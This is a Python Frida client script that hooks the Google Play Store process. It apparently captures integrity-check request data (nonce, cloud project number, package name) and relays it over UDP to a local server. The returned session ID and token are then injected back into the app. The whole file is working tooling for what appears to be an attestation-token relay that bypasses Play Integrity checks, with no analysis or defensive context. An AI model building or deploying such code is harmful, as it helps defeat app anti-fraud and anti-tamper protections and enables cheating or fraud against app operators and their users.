import frida
import socket
import sys
import threading
import time

def print_usage():
  print("Usage: [client phone] [optional: port]\n")

   

def udp_action(nonce, cloud_project_number, package_name):
  SERVER_IP = "127.0.0.1"
  SERVER_PORT = 5362

  CLIENT_IP = SERVER_IP
  CLIENT_PORT = 5151

  message = bytes(nonce) + b"\n" + int(cloud_project_number).to_bytes(8, "big", signed=True) + b"\n" + package_name.encode("UTF-8") + b"\n\n"
  sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  sock.bind((CLIENT_IP, CLIENT_PORT))
  
  print("[+] client.py: Sending request to server...")
  sock.sendto(message, (SERVER_IP, SERVER_PORT))

  sock.settimeout(15)
  
  try:
    data, addr = sock.recvfrom(2048)

    if (addr[0] == SERVER_IP):
      if (data.split(b'\n')[0].decode('UTF-8') == "SUCCESS"):
        sessionId = int.from_bytes(data.split(b'\n')[1], "big", signed=True)
        print(f"[+] client.py: Received sessionId: {sessionId}")
        token = (data.split(b'\n')[2]).decode("UTF-8")
        print(f"[+] client.py: Received token: {token[:50]}...")
        sock.close()
        return sessionId, token
      else:
        try:
          e = int.from_bytes(data.split(b'\n')[1], "big", signed=True)
          print("[+] client.py: Error from server: " + str(e))
        except:
          msg = data.split(b'\n')[1].decode('UTF-8')
          print("[+] client.py: Error from server: " + msg)
        finally:
          sock.close
          return None, None

      
  except socket.timeout:
    print("[-] client.py: Timeout waiting for server response")
    sock.close()
    return None, None


def find_device(device_name, custom_port=None):
  if custom_port:
    print(f"[+] client.py: Adding remote device on port {custom_port}...")
    device_manager = frida.get_device_manager()
    try:

      device = device_manager.add_remote_device(f'127.0.0.1:{custom_port}')
      print(f"[+] client.py: Connected to remote device on port {custom_port}")
      return device
    except Exception as e:
      print(f"[!] client.py: Failed to connect to custom port {custom_port}: {e}")
      print("[!] client.py: Make sure frida-server is running with: adb shell '/data/local/tmp/frida-server -l 0.0.0.0:{custom_port}'")
      sys.exit(1)
  

  devices = frida.enumerate_devices()
  for device in devices:
    if device.id == device_name:
      return device
    
  print("Could not find device's serial\n" \
  "Check if it is the correct one with adb devices command")
  sys.exit(0)

def find_pid(device, package_name):
  for a in device.enumerate_applications():
    if a.identifier == package_name:
        return a.pid
  
  print("[-] client.py: PID not found")
  return -1
    

client_data = {
  "nonce": None,
  "cloudProjectNumber": -1,
  "packageName": "",
  "script": None,
  "session": None,
  "data_ready": threading.Event(),
  "response_ready": threading.Event(),
  "should_exit": threading.Event()
}

def client_message(message, data):
  if (message["type"] == "send"):
    payload = message["payload"]

    if (isinstance(payload, dict)):
      if (payload.get("type") == "nonce"):
        client_data["nonce"] = payload.get("data")
        print(f"[+] client.py: Received nonce: {payload.get('data')} bytes")
      
      elif (payload.get("type") == "package_name"):
        client_data["packageName"] = payload.get("data")
        print(f"[+] client.py: Received package name: {payload.get('data')}")
      
      elif (payload.get("type") == "cloud_project_number"):
        client_data["cloudProjectNumber"] = payload.get("data")
        print(f"[+] client.py: Received cloud project number: {payload.get('data')}")

    if (client_data["nonce"] != None and client_data["packageName"] != "" and client_data["cloudProjectNumber"] != -1):
      print("[+] client.py: All the information are received, contacting server...")
      
      # Signal that we have the data needed
      client_data["data_ready"].set()
      
      sessionId, token = udp_action(client_data["nonce"], client_data["cloudProjectNumber"], client_data["packageName"])

      if sessionId is not None and token is not None:
        print("[+] client.py: Posting response to client.ts...")
        client_data["script"].post({
          "type": "server_data",
          "sessionId": sessionId,
          "token": token
        })
        
        client_data["response_ready"].set()
        print("[+] client.py: Waiting for operations to complete...")
        time.sleep(5)
        
        print("[+] client.py: Operations complete, cleaning up Frida session...")
        try:
          if client_data["script"]:
            client_data["script"].unload()
            print("[+] client.py: Unloaded client.js script")
          
          if client_data["session"]:
            client_data["session"].detach()
            print("[+] client.py: Detached from com.android.vending")
            
          print("[+] client.py: Frida process interrupted successfully")
          client_data["should_exit"].set()
          
        except Exception as e:
          print("[-] client.py: Error during cleanup" + str(e))
          client_data["should_exit"].set()
      else:
        print("[-] client.py: Failed to get response from server")
        client_data["should_exit"].set()

def on_detached(reason, crash):
  print(f"\n[!] client.py: Process detached. Reason: {reason}")
  if crash:
    print(f"[!] client.py: Crash report: {crash}")
  else:
    print("[*] Process was likely killed or terminated")
  client_data["should_exit"].set()

def client_script(device):
  pid = find_pid(device, "com.android.vending")
  
  try:
    session = device.attach(pid)
    session.on("detached", on_detached)
    client_data["session"] = session
    print("[+] client.py: Attached to com.android.vending " + str(pid))
  except:
    print(f"[!] client.py: Please relaunch PlayStore")
    input("Press Enter after relaunching the app")
    client_script(device)

  

  js = open("client.js").read()
  script = client_data["session"].create_script(js)

  script.on('message', client_message)

  script.load()

  client_data["script"] = script
  print("[+] client.py: Loaded client.js script")

if __name__ == '__main__':
  if (len(sys.argv) < 2):
    print_usage()
    sys.exit(1)

  custom_port = None
  if len(sys.argv) >= 3:
    try:
      custom_port = int(sys.argv[2])
    except ValueError:
      print("[-] client.py: Invalid port number")
      sys.exit(1)

  client_device = find_device(sys.argv[1], custom_port)
  client_script(client_device)

  print("[+] client.py: Client ready and listening... you can start the targeted app")
  client_data["should_exit"].wait()
  client_data["session"].detach()
  print("[+] client.py: Detached!")